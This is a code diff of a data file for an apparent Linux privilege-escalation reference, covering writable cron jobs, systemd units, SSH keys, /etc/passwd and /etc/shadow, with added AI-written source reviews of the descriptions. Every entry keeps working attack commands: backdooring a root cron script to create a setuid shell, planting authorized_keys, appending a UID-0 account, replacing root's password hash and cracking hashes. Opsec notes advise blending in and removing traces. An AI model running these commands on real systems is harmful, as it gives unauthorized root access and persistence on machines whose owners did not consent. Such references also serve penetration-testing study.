-    requires: ['A cron job or systemd timer that runs as root and executes a file or directory you can write'],
-    commands: [
-      { label: 'Enumerate scheduled jobs', code: r`cat /etc/crontab; ls -la /etc/cron.*; crontab -l
-systemctl list-timers --all`, lang: 'bash' },
-      { label: 'Catch unlisted jobs live', code: r`./pspy64`, lang: 'bash' },
-      { label: 'Backdoor a writable job script', code: r`echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/job.sh
-# after it fires:
-/tmp/rootbash -p`, lang: 'bash' },
+    "id": "lin-cron-writable",
+    "label": "Writable Cron Job",
+    "phase": "jobs",
+    "summary": "Distinguish user crontabs from system job definitions.",
+    "description": "Cron schedules work from crontab definitions. In Cronie, a user crontab's commands run as its owner. The system crontab and files in /etc/cron.d use an additional field to identify the account for a job. A schedule and the account that executes its work are distinct parts of a job definition.",
+    "requires": [
+      "A cron job or systemd timer that runs as root and executes a file or directory you can write"
     ],
-    tools: [{ name: 'pspy', url: 'https://github.com/DominicBreuker/pspy' }],
-    mitre: mitre('T1053.003'),
-    references: [
-      { label: 'MITRE ATT&CK, Scheduled Task/Job: Cron (T1053.003)', url: 'https://attack.mitre.org/techniques/T1053/003/' },
-      { label: 'InternalAllTheThings, Linux Privilege Escalation (cron)', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
+    "commands": [
+      {
+        "label": "Enumerate scheduled jobs",
+        "code": "cat /etc/crontab; ls -la /etc/cron.*; crontab -l\nsystemctl list-timers --all",
+        "lang": "bash"
+      },
+      {
+        "label": "Catch unlisted jobs live",
+        "code": "./pspy64",
+        "lang": "bash"
+      },
+      {
+        "label": "Backdoor a writable job script",
+        "code": "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/job.sh\n# after it fires:\n/tmp/rootbash -p",
+        "lang": "bash"
+      }
     ],
-    opsec: 'The modified script and a setuid /tmp/rootbash are on-disk artifacts. pspy is quiet (it watches /proc via inotify and scans it, no root or ptrace needed), but the payload firing as root is logged by cron and auditd.',
+    "tools": [
+      {
+        "name": "pspy",
+        "url": "https://github.com/DominicBreuker/pspy"
+      }
+    ],
+    "mitre": {
+      "id": "T1053.003",
+      "url": "https://attack.mitre.org/techniques/T1053/003/"
+    },
+    "references": [
+      {
+        "label": "Cronie, crontab(5)",
+        "url": "https://man7.org/linux/man-pages/man5/crontab.5.html",
+        "kind": "primary"
+      },
+      {
+        "label": "MITRE ATT&CK, Scheduled Task/Job: Cron (T1053.003)",
+        "url": "https://attack.mitre.org/techniques/T1053/003/"
+      },
+      {
+        "label": "InternalAllTheThings, Linux Privilege Escalation (cron)",
+        "url": "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/"
+      }
+    ],
+    "opsec": "The modified script and a setuid /tmp/rootbash are on-disk artifacts. pspy is quiet (it watches /proc via inotify and scans it, no root or ptrace needed), but the payload firing as root is logged by cron and auditd.",
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual Linux configuration definitions: capabilities, account records, job execution identity, NFS export tables and container identities. Excludes commands, tools, prerequisites, exploit mechanics, applicability, current host configuration, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "commands": [
+          {
+            "code": "cat /etc/crontab; ls -la /etc/cron.*; crontab -l\nsystemctl list-timers --all",
+            "label": "Enumerate scheduled jobs",
+            "lang": "bash"
+          },
+          {
+            "code": "./pspy64",
+            "label": "Catch unlisted jobs live",
+            "lang": "bash"
+          },
+          {
+            "code": "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/job.sh\n# after it fires:\n/tmp/rootbash -p",
+            "label": "Backdoor a writable job script",
+            "lang": "bash"
+          }
+        ],
+        "description": "Cron schedules work from crontab definitions. In Cronie, a user crontab's commands run as its owner. The system crontab and files in /etc/cron.d use an additional field to identify the account for a job. A schedule and the account that executes its work are distinct parts of a job definition.",
+        "id": "lin-cron-writable",
+        "label": "Writable Cron Job",
+        "mitre": {
+          "id": "T1053.003",
+          "url": "https://attack.mitre.org/techniques/T1053/003/"
+        },
+        "opsec": "The modified script and a setuid /tmp/rootbash are on-disk artifacts. pspy is quiet (it watches /proc via inotify and scans it, no root or ptrace needed), but the payload firing as root is logged by cron and auditd.",
+        "phase": "jobs",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Cronie, crontab(5)",
+            "url": "https://man7.org/linux/man-pages/man5/crontab.5.html"
+          },
+          {
+            "label": "MITRE ATT&CK, Scheduled Task/Job: Cron (T1053.003)",
+            "url": "https://attack.mitre.org/techniques/T1053/003/"
+          },
+          {
+            "label": "InternalAllTheThings, Linux Privilege Escalation (cron)",
+            "url": "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/"
+          }
+        ],
+        "requires": [
+          "A cron job or systemd timer that runs as root and executes a file or directory you can write"
+        ],
+        "summary": "Distinguish user crontabs from system job definitions.",
+        "tools": [
+          {
+            "name": "pspy",
+            "url": "https://github.com/DominicBreuker/pspy"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "Cronie runs commands in a user crontab under the account that owns that crontab.",
+          "section": "Cronie, crontab(5) — DESCRIPTION: user crontabs",
+          "sources": [
+            "https://man7.org/linux/man-pages/man5/crontab.5.html"
+          ]
+        },
+        {
+          "text": "Cronie system crontabs use an additional username field to identify the account for each job.",
+          "section": "Cronie, crontab(5) — Jobs in /etc/cron.d/",
+          "sources": [
+            "https://man7.org/linux/man-pages/man5/crontab.5.html"
+          ]
+        }
+      ]
+    }
   },
   {
     id: 'lin-cron-wildcard',
@@ -339,27 +1048,129 @@ touch -- '--checkpoint-action=exec=sh sh.sh'
     opsec: 'The flag-named files are visible to anyone who lists the directory, and the spawned action is logged when the job runs. Clean up the crafted filenames after the job fires. If /tmp is mounted nosuid (common on hardened hosts), the /tmp/rb setuid trick is inert; have the action drop the setuid binary somewhere exec+suid-capable (/var/tmp or the user home) or just run a reverse shell / add a key from the action instead.',
   },
   {
-    id: 'lin-systemd',
-    label: 'Writable systemd Unit / Timer',
-    phase: 'jobs',
-    summary: 'A writable unit file, or its ExecStart target, runs your command as root.',
-    description:
-      'Services run as root through systemd units. If a unit file, a drop-in it includes, or the binary/script named in ExecStart is writable, set ExecStart to your payload (or edit the target) and start or wait for the service. A writable timer that triggers such a unit is the scheduled variant. Relative-path or writable-PATH ExecStart lines are the same class of bug as cron PATH hijacking.',
-    requires: ['A writable systemd unit/timer, drop-in, or ExecStart target for a service that runs as root'],
-    commands: [
-      { label: 'Find writable units', code: r`find /etc/systemd /lib/systemd /usr/lib/systemd /usr/local/lib/systemd /run/systemd -writable -name '*.service' 2>/dev/null
-systemctl list-units --type=service`, lang: 'bash' },
-      { label: 'Point ExecStart at a payload, then run it', code: r`# in a writable .service:
-# ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb'
-systemctl daemon-reload && systemctl start <unit>   # if allowed`, lang: 'bash' },
+    "id": "lin-systemd",
+    "label": "Writable systemd Unit / Timer",
+    "phase": "jobs",
+    "summary": "Distinguish timer activation from service execution identity.",
+    "description": "A systemd timer activates another unit, ordinarily the service with the corresponding name. The activated service has its own execution configuration. systemd documents user and group identity settings for system services and distinguishes them from services run by a user's service manager. The timer schedule alone does not describe the service's identity.",
+    "requires": [
+      "A writable systemd unit/timer, drop-in, or ExecStart target for a service that runs as root"
     ],
-    mitre: mitre('T1543.002'),
-    references: [
-      { label: 'MITRE ATT&CK, Systemd Service (T1543.002), the service path', url: 'https://attack.mitre.org/techniques/T1543/002/' },
-      { label: 'MITRE ATT&CK, Scheduled Task/Job: Systemd Timers (T1053.006), the timer path', url: 'https://attack.mitre.org/techniques/T1053/006/' },
-      { label: 'InternalAllTheThings, Linux Privilege Escalation (systemd)', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
+    "commands": [
+      {
+        "label": "Find writable units",
+        "code": "find /etc/systemd /lib/systemd /usr/lib/systemd /usr/local/lib/systemd /run/systemd -writable -name '*.service' 2>/dev/null\nsystemctl list-units --type=service",
+        "lang": "bash"
+      },
+      {
+        "label": "Point ExecStart at a payload, then run it",
+        "code": "# in a writable .service:\n# ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb'\nsystemctl daemon-reload && systemctl start <unit>   # if allowed",
+        "lang": "bash"
+      }
     ],
-    opsec: 'Editing a unit and daemon-reload are logged by the journal; a service whose ExecStart changed is an obvious integrity event. Restarting a system service may disrupt it and draw attention.',
+    "mitre": {
+      "id": "T1543.002",
+      "url": "https://attack.mitre.org/techniques/T1543/002/"
+    },
+    "references": [
+      {
+        "label": "systemd, systemd.timer(5)",
+        "url": "https://man7.org/linux/man-pages/man5/systemd.timer.5.html",
+        "kind": "primary"
+      },
+      {
+        "label": "systemd, systemd.exec(5)",
+        "url": "https://man7.org/linux/man-pages/man5/systemd.exec.5.html",
+        "kind": "primary"
+      },
+      {
+        "label": "MITRE ATT&CK, Systemd Service (T1543.002), the service path",
+        "url": "https://attack.mitre.org/techniques/T1543/002/"
+      },
+      {
+        "label": "MITRE ATT&CK, Scheduled Task/Job: Systemd Timers (T1053.006), the timer path",
+        "url": "https://attack.mitre.org/techniques/T1053/006/"
+      },
+      {
+        "label": "InternalAllTheThings, Linux Privilege Escalation (systemd)",
+        "url": "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/"
+      }
+    ],
+    "opsec": "Editing a unit and daemon-reload are logged by the journal; a service whose ExecStart changed is an obvious integrity event. Restarting a system service may disrupt it and draw attention.",
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual Linux configuration definitions: capabilities, account records, job execution identity, NFS export tables and container identities. Excludes commands, tools, prerequisites, exploit mechanics, applicability, current host configuration, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "commands": [
+          {
+            "code": "find /etc/systemd /lib/systemd /usr/lib/systemd /usr/local/lib/systemd /run/systemd -writable -name '*.service' 2>/dev/null\nsystemctl list-units --type=service",
+            "label": "Find writable units",
+            "lang": "bash"
+          },
+          {
+            "code": "# in a writable .service:\n# ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb'\nsystemctl daemon-reload && systemctl start <unit>   # if allowed",
+            "label": "Point ExecStart at a payload, then run it",
+            "lang": "bash"
+          }
+        ],
+        "description": "A systemd timer activates another unit, ordinarily the service with the corresponding name. The activated service has its own execution configuration. systemd documents user and group identity settings for system services and distinguishes them from services run by a user's service manager. The timer schedule alone does not describe the service's identity.",
+        "id": "lin-systemd",
+        "label": "Writable systemd Unit / Timer",
+        "mitre": {
+          "id": "T1543.002",
+          "url": "https://attack.mitre.org/techniques/T1543/002/"
+        },
+        "opsec": "Editing a unit and daemon-reload are logged by the journal; a service whose ExecStart changed is an obvious integrity event. Restarting a system service may disrupt it and draw attention.",
+        "phase": "jobs",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "systemd, systemd.timer(5)",
+            "url": "https://man7.org/linux/man-pages/man5/systemd.timer.5.html"
+          },
+          {
+            "kind": "primary",
+            "label": "systemd, systemd.exec(5)",
+            "url": "https://man7.org/linux/man-pages/man5/systemd.exec.5.html"
+          },
+          {
+            "label": "MITRE ATT&CK, Systemd Service (T1543.002), the service path",
+            "url": "https://attack.mitre.org/techniques/T1543/002/"
+          },
+          {
+            "label": "MITRE ATT&CK, Scheduled Task/Job: Systemd Timers (T1053.006), the timer path",
+            "url": "https://attack.mitre.org/techniques/T1053/006/"
+          },
+          {
+            "label": "InternalAllTheThings, Linux Privilege Escalation (systemd)",
+            "url": "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/"
+          }
+        ],
+        "requires": [
+          "A writable systemd unit/timer, drop-in, or ExecStart target for a service that runs as root"
+        ],
+        "summary": "Distinguish timer activation from service execution identity."
+      },
+      "claims": [
+        {
+          "text": "A systemd timer activates another unit and defaults to the service with the matching name.",
+          "section": "systemd, systemd.timer(5) — DESCRIPTION: matching unit and default service",
+          "sources": [
+            "https://man7.org/linux/man-pages/man5/systemd.timer.5.html"
+          ]
+        },
+        {
+          "text": "systemd documents service user and group identity separately and distinguishes system services from services run by a user's service manager.",
+          "section": "systemd, systemd.exec(5) — USER/GROUP IDENTITY — User=, Group=",
+          "sources": [
+            "https://man7.org/linux/man-pages/man5/systemd.exec.5.html"
+          ]
+        }
+      ]
+    }
   },
   {
     id: 'lin-writable-script',
@@ -434,32 +1245,172 @@ cat /proc/<pid>/maps; strings /proc/<pid>/mem 2>/dev/null | grep -i pass | head`
     opsec: 'Recursive greps across the filesystem are I/O-heavy and slow; they are only logged if the host runs file/read audit rules (auditd read watches, EDR, or fanotify), which are not the default, so scope to likely directories first. Reading another process memory via /proc/<pid>/mem needs ptrace access (gated by kernel.yama.ptrace_scope) and is itself suspicious.',
   },
   {
-    id: 'lin-ssh-keys',
-    label: 'SSH Keys & Trust',
-    phase: 'creds',
-    summary: 'Recover a private key, abuse an SSH CA, or write an authorized_keys entry.',
-    description:
-      'SSH offers several trust paths beyond a password. Hunt for readable private keys (id_rsa/ed25519) in home directories, backups, and world-readable locations, and reuse a passphrase you already cracked. Where an SSH certificate authority signs user certs, a leaked CA key lets you mint a cert for any principal the server\'s CA config accepts (bounded by TrustedUserCAKeys and its AuthorizedPrincipalsFile / principals mapping). And any write into a target user root can drop an authorized_keys entry for a login as them.',
-    requires: ['A readable SSH private key, a leaked SSH CA signing key, or write access to a target authorized_keys'],
-    commands: [
-      { label: 'Find private keys', code: r`find / -name 'id_*' -o -name 'authorized_keys' 2>/dev/null
-grep -rl 'PRIVATE KEY' /home /root /var 2>/dev/null`, lang: 'bash' },
-      { label: 'Crack a key passphrase', code: r`ssh2john id_rsa > h; john --wordlist=rockyou.txt h`, lang: 'bash' },
-      { label: 'Mint a cert from a leaked SSH CA key', code: r`ssh-keygen -s ca_key -I <cert-id> -n <principal> user.pub   # then: ssh -i user -i user-cert.pub <user>@<host>`, lang: 'bash' },
-      { label: 'Plant a key (if you can write ~/.ssh)', code: r`ssh-keygen -f k -N ''
-install -d -m700 /home/<user>/.ssh
-cat k.pub >> /home/<user>/.ssh/authorized_keys
-chmod 600 /home/<user>/.ssh/authorized_keys
-chown -R <user>:<user> /home/<user>/.ssh   # sshd StrictModes refuses group/world-writable or wrong-owner .ssh`, lang: 'bash' },
+    "id": "lin-ssh-keys",
+    "label": "SSH Keys & Trust",
+    "phase": "creds",
+    "summary": "Understand SSH key pairs and the roles of user and host certificates.",
+    "description": "SSH public-key authentication verifies a signature made with the user's private key. OpenSSH certificates add identity information to a public key and have a certificate authority's signature. User certificates authenticate users to servers; host certificates authenticate servers to users. These roles distinguish the user's identity from the server's identity and explain why key pairs and certificates represent different parts of the trust model.",
+    "requires": [
+      "A readable SSH private key, a leaked SSH CA signing key, or write access to a target authorized_keys"
     ],
-    tools: [{ name: 'John the Ripper', url: 'https://github.com/openwall/john' }],
-    mitre: mitre('T1552.004'),
-    references: [
-      { label: 'MITRE ATT&CK, Private Keys (T1552.004), the private-key recovery path', url: 'https://attack.mitre.org/techniques/T1552/004/' },
-      { label: 'MITRE ATT&CK, SSH Authorized Keys (T1098.004), the authorized_keys plant', url: 'https://attack.mitre.org/techniques/T1098/004/' },
-      { label: 'InternalAllTheThings, Linux Privilege Escalation', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
+    "commands": [
+      {
+        "label": "Find private keys",
+        "code": "find / -name 'id_*' -o -name 'authorized_keys' 2>/dev/null\ngrep -rl 'PRIVATE KEY' /home /root /var 2>/dev/null",
+        "lang": "bash"
+      },
+      {
+        "label": "Crack a key passphrase",
+        "code": "ssh2john id_rsa > h; john --wordlist=rockyou.txt h",
+        "lang": "bash"
+      },
+      {
+        "label": "Mint a cert from a leaked SSH CA key",
+        "code": "ssh-keygen -s ca_key -I <cert-id> -n <principal> user.pub   # then: ssh -i user -i user-cert.pub <user>@<host>",
+        "lang": "bash"
+      },
+      {
+        "label": "Plant a key (if you can write ~/.ssh)",
+        "code": "ssh-keygen -f k -N ''\ninstall -d -m700 /home/<user>/.ssh\ncat k.pub >> /home/<user>/.ssh/authorized_keys\nchmod 600 /home/<user>/.ssh/authorized_keys\nchown -R <user>:<user> /home/<user>/.ssh   # sshd StrictModes refuses group/world-writable or wrong-owner .ssh",
+        "lang": "bash"
+      }
     ],
-    opsec: 'A new authorized_keys entry and subsequent SSH login are logged: sshd writes "Accepted publickey" to /var/log/auth.log (Debian/Ubuntu) or /var/log/secure (RHEL), plus wtmp/lastlog/journald entries. Reusing an existing key blends in far better than adding one.',
+    "tools": [
+      {
+        "name": "John the Ripper",
+        "url": "https://github.com/openwall/john"
+      }
+    ],
+    "mitre": {
+      "id": "T1552.004",
+      "url": "https://attack.mitre.org/techniques/T1552/004/"
+    },
+    "references": [
+      {
+        "label": "RFC 4252, SSH Authentication Protocol",
+        "url": "https://www.rfc-editor.org/rfc/rfc4252.html",
+        "section": "7. Public Key Authentication Method",
+        "kind": "primary"
+      },
+      {
+        "label": "OpenBSD, ssh-keygen(1)",
+        "url": "https://man.openbsd.org/ssh-keygen",
+        "section": "CERTIFICATES: opening definition and user/host certificate distinction",
+        "kind": "primary"
+      },
+      {
+        "label": "MITRE ATT&CK, Private Keys (T1552.004), the private-key recovery path",
+        "url": "https://attack.mitre.org/techniques/T1552/004/"
+      },
+      {
+        "label": "MITRE ATT&CK, SSH Authorized Keys (T1098.004), the authorized_keys plant",
+        "url": "https://attack.mitre.org/techniques/T1098/004/"
+      },
+      {
+        "label": "InternalAllTheThings, Linux Privilege Escalation",
+        "url": "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/"
+      }
+    ],
+    "opsec": "A new authorized_keys entry and subsequent SSH login are logged: sshd writes \"Accepted publickey\" to /var/log/auth.log (Debian/Ubuntu) or /var/log/secure (RHEL), plus wtmp/lastlog/journald entries. Reusing an existing key blends in far better than adding one.",
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in the account, credential, and authentication explanation. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "commands": [
+          {
+            "code": "find / -name 'id_*' -o -name 'authorized_keys' 2>/dev/null\ngrep -rl 'PRIVATE KEY' /home /root /var 2>/dev/null",
+            "label": "Find private keys",
+            "lang": "bash"
+          },
+          {
+            "code": "ssh2john id_rsa > h; john --wordlist=rockyou.txt h",
+            "label": "Crack a key passphrase",
+            "lang": "bash"
+          },
+          {
+            "code": "ssh-keygen -s ca_key -I <cert-id> -n <principal> user.pub   # then: ssh -i user -i user-cert.pub <user>@<host>",
+            "label": "Mint a cert from a leaked SSH CA key",
+            "lang": "bash"
+          },
+          {
+            "code": "ssh-keygen -f k -N ''\ninstall -d -m700 /home/<user>/.ssh\ncat k.pub >> /home/<user>/.ssh/authorized_keys\nchmod 600 /home/<user>/.ssh/authorized_keys\nchown -R <user>:<user> /home/<user>/.ssh   # sshd StrictModes refuses group/world-writable or wrong-owner .ssh",
+            "label": "Plant a key (if you can write ~/.ssh)",
+            "lang": "bash"
+          }
+        ],
+        "description": "SSH public-key authentication verifies a signature made with the user's private key. OpenSSH certificates add identity information to a public key and have a certificate authority's signature. User certificates authenticate users to servers; host certificates authenticate servers to users. These roles distinguish the user's identity from the server's identity and explain why key pairs and certificates represent different parts of the trust model.",
+        "id": "lin-ssh-keys",
+        "label": "SSH Keys & Trust",
+        "mitre": {
+          "id": "T1552.004",
+          "url": "https://attack.mitre.org/techniques/T1552/004/"
+        },
+        "opsec": "A new authorized_keys entry and subsequent SSH login are logged: sshd writes \"Accepted publickey\" to /var/log/auth.log (Debian/Ubuntu) or /var/log/secure (RHEL), plus wtmp/lastlog/journald entries. Reusing an existing key blends in far better than adding one.",
+        "phase": "creds",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "RFC 4252, SSH Authentication Protocol",
+            "section": "7. Public Key Authentication Method",
+            "url": "https://www.rfc-editor.org/rfc/rfc4252.html"
+          },
+          {
+            "kind": "primary",
+            "label": "OpenBSD, ssh-keygen(1)",
+            "section": "CERTIFICATES: opening definition and user/host certificate distinction",
+            "url": "https://man.openbsd.org/ssh-keygen"
+          },
+          {
+            "label": "MITRE ATT&CK, Private Keys (T1552.004), the private-key recovery path",
+            "url": "https://attack.mitre.org/techniques/T1552/004/"
+          },
+          {
+            "label": "MITRE ATT&CK, SSH Authorized Keys (T1098.004), the authorized_keys plant",
+            "url": "https://attack.mitre.org/techniques/T1098/004/"
+          },
+          {
+            "label": "InternalAllTheThings, Linux Privilege Escalation",
+            "url": "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/"
+          }
+        ],
+        "requires": [
+          "A readable SSH private key, a leaked SSH CA signing key, or write access to a target authorized_keys"
+        ],
+        "summary": "Understand SSH key pairs and the roles of user and host certificates.",
+        "tools": [
+          {
+            "name": "John the Ripper",
+            "url": "https://github.com/openwall/john"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "SSH public-key authentication uses a signature produced with the user's private key.",
+          "section": "RFC 4252, SSH Authentication Protocol — 7. Public Key Authentication Method",
+          "sources": [
+            "https://www.rfc-editor.org/rfc/rfc4252.html"
+          ]
+        },
+        {
+          "text": "An OpenSSH certificate contains a public key and identity information signed by a certificate authority.",
+          "section": "OpenBSD, ssh-keygen(1) — CERTIFICATES: opening definition and user/host certificate distinction",
+          "sources": [
+            "https://man.openbsd.org/ssh-keygen"
+          ]
+        },
+        {
+          "text": "OpenSSH user certificates authenticate users to servers, while host certificates authenticate servers to users.",
+          "section": "OpenBSD, ssh-keygen(1) — CERTIFICATES: opening definition and user/host certificate distinction",
+          "sources": [
+            "https://man.openbsd.org/ssh-keygen"
+          ]
+        }
+      ]
+    }
   },
   {
     id: 'lin-db-creds',
@@ -535,51 +1486,254 @@ gdb -p <pid>    # or read /proc/<pid>/mem, dump environ/cmdline`, lang: 'bash' }
 
   // ── Lane 5: Writable Files & Shares ─────────────────────────────────────────────
   {
-    id: 'lin-passwd',
-    label: 'Writable /etc/passwd',
-    phase: 'files',
-    summary: 'Append a UID-0 account with a known password to a writable passwd file.',
-    description:
-      'If /etc/passwd is writable, add your own root-equivalent account. A passwd line\'s second field can hold a crypt(3) password hash of any format ($1$ MD5, $5$ SHA-256, $6$ SHA-512, $y$ yescrypt), which takes precedence over /etc/shadow, so append an entry with UID 0 and a password hash you generated, then su to it. Even without a hash field, a writable passwd lets you point an existing account at a shell or clear a root password prompt.',
-    requires: ['Write access to /etc/passwd'],
-    commands: [
-      { label: 'Confirm it is writable', code: r`ls -la /etc/passwd`, lang: 'bash' },
-      { label: 'Append a UID-0 account and su in', code: r`openssl passwd -1 hacked            # -> $1$...hash
-echo 'r00t:$1$...hash:0:0:root:/root:/bin/bash' >> /etc/passwd
-su r00t     # password: hacked`, lang: 'bash' },
+    "id": "lin-passwd",
+    "label": "Writable /etc/passwd",
+    "phase": "files",
+    "summary": "Understand the account records and permissions of /etc/passwd.",
+    "description": "/etc/passwd describes system login accounts. Its records include the login name, user and primary group IDs, account information, home directory and login program. The Linux manual recommends making this account information readable by users while restricting writes to the superuser. Account information and authority to modify it are separate concerns.",
+    "requires": [
+      "Write access to /etc/passwd"
     ],
-    mitre: mitre('T1136.001'),
-    references: [
-      { label: 'MITRE ATT&CK, Create Account: Local Account (T1136.001)', url: 'https://attack.mitre.org/techniques/T1136/001/' },
-      { label: 'MITRE ATT&CK, File and Directory Permissions Modification: Linux and Mac (T1222.002), the writable-file abuse', url: 'https://attack.mitre.org/techniques/T1222/002/' },
-      { label: 'InternalAllTheThings, Linux Privilege Escalation (writable /etc/passwd)', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
+    "commands": [
+      {
+        "label": "Confirm it is writable",
+        "code": "ls -la /etc/passwd",
+        "lang": "bash"
+      },
+      {
+        "label": "Append a UID-0 account and su in",
+        "code": "openssl passwd -1 hacked            # -> $1$...hash\necho 'r00t:$1$...hash:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu r00t     # password: hacked",
+        "lang": "bash"
+      }
     ],
-    opsec: 'A second UID-0 account in /etc/passwd is glaring in any review and integrity monitoring flags the change. Remove the added line once you have a root shell.',
+    "mitre": {
+      "id": "T1136.001",
+      "url": "https://attack.mitre.org/techniques/T1136/001/"
+    },
+    "references": [
+      {
+        "label": "Linux man-pages, passwd(5)",
+        "url": "https://man7.org/linux/man-pages/man5/passwd.5.html",
+        "kind": "primary"
+      },
+      {
+        "label": "MITRE ATT&CK, Create Account: Local Account (T1136.001)",
+        "url": "https://attack.mitre.org/techniques/T1136/001/"
+      },
+      {
+        "label": "MITRE ATT&CK, File and Directory Permissions Modification: Linux and Mac (T1222.002), the writable-file abuse",
+        "url": "https://attack.mitre.org/techniques/T1222/002/"
+      },
+      {
+        "label": "InternalAllTheThings, Linux Privilege Escalation (writable /etc/passwd)",
+        "url": "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/"
+      }
+    ],
+    "opsec": "A second UID-0 account in /etc/passwd is glaring in any review and integrity monitoring flags the change. Remove the added line once you have a root shell.",
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual Linux configuration definitions: capabilities, account records, job execution identity, NFS export tables and container identities. Excludes commands, tools, prerequisites, exploit mechanics, applicability, current host configuration, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "commands": [
+          {
+            "code": "ls -la /etc/passwd",
+            "label": "Confirm it is writable",
+            "lang": "bash"
+          },
+          {
+            "code": "openssl passwd -1 hacked            # -> $1$...hash\necho 'r00t:$1$...hash:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu r00t     # password: hacked",
+            "label": "Append a UID-0 account and su in",
+            "lang": "bash"
+          }
+        ],
+        "description": "/etc/passwd describes system login accounts. Its records include the login name, user and primary group IDs, account information, home directory and login program. The Linux manual recommends making this account information readable by users while restricting writes to the superuser. Account information and authority to modify it are separate concerns.",
+        "id": "lin-passwd",
+        "label": "Writable /etc/passwd",
+        "mitre": {
+          "id": "T1136.001",
+          "url": "https://attack.mitre.org/techniques/T1136/001/"
+        },
+        "opsec": "A second UID-0 account in /etc/passwd is glaring in any review and integrity monitoring flags the change. Remove the added line once you have a root shell.",
+        "phase": "files",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Linux man-pages, passwd(5)",
+            "url": "https://man7.org/linux/man-pages/man5/passwd.5.html"
+          },
+          {
+            "label": "MITRE ATT&CK, Create Account: Local Account (T1136.001)",
+            "url": "https://attack.mitre.org/techniques/T1136/001/"
+          },
+          {
+            "label": "MITRE ATT&CK, File and Directory Permissions Modification: Linux and Mac (T1222.002), the writable-file abuse",
+            "url": "https://attack.mitre.org/techniques/T1222/002/"
+          },
+          {
+            "label": "InternalAllTheThings, Linux Privilege Escalation (writable /etc/passwd)",
+            "url": "https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/"
+          }
+        ],
+        "requires": [
+          "Write access to /etc/passwd"
+        ],
+        "summary": "Understand the account records and permissions of /etc/passwd."
+      },
+      "claims": [
+        {
+          "text": "/etc/passwd describes login accounts and records the login name, UID, primary GID, account information, home directory and login program.",
+          "section": "Linux man-pages, passwd(5) — DESCRIPTION: account records and field definitions",
+          "sources": [
+            "https://man7.org/linux/man-pages/man5/passwd.5.html"
+          ]
+        },
+        {
+          "text": "The Linux manual recommends general read access to /etc/passwd and superuser-only write access.",
+          "section": "Linux man-pages, passwd(5) — DESCRIPTION: opening file-permission guidance",
+          "sources": [
+            "https://man7.org/linux/man-pages/man5/passwd.5.html"
+          ]
+        }
+      ]
+    }
   },
   {
-    id: 'lin-shadow',
-    label: 'Readable / Writable /etc/shadow',
-    phase: 'files',
-    summary: 'Crack the root hash if shadow is readable; replace it if writable.',
-    description:
-      'A misconfigured /etc/shadow is a direct route to root. If it is readable, extract the root hash and crack it offline. If it is writable, replace the root hash with one you generated and su in with the matching password. Either way the account model is untouched, so the change is subtle compared with editing /etc/passwd.',
-    requires: ['Read access (to crack) or write access (to replace the hash) on /etc/shadow'],
-    commands: [
-      { label: 'Readable: crack the root hash', code: r`unshadow /etc/passwd /etc/shadow > u
-john --wordlist=/usr/share/wordlists/rockyou.txt u    # gunzip rockyou.txt.gz first if it ships compressed`, lang: 'bash' },
-      { label: 'Writable: replace the root hash', code: r`openssl passwd -6 hacked      # generate a SHA-512 crypt hash
-# edit /etc/shadow: set root's 2nd field to the new hash, then:
-su -`, lang: 'bash' },
+    "id": "lin-shadow",
+    "label": "Readable / Writable /etc/shadow",
+    "phase": "files",
+    "summary": "Understand protected password records and password-aging information.",
+    "description": "/etc/shadow stores account password information and optional password-aging information. The shadow-utils manual describes fields for the last password change, minimum and maximum password ages, warnings and expiration. It states that regular users must not be able to read the file if password security is to be maintained.",
+    "requires": [
+      "Read access (to crack) or write access (to replace the hash) on /etc/shadow"
     ],
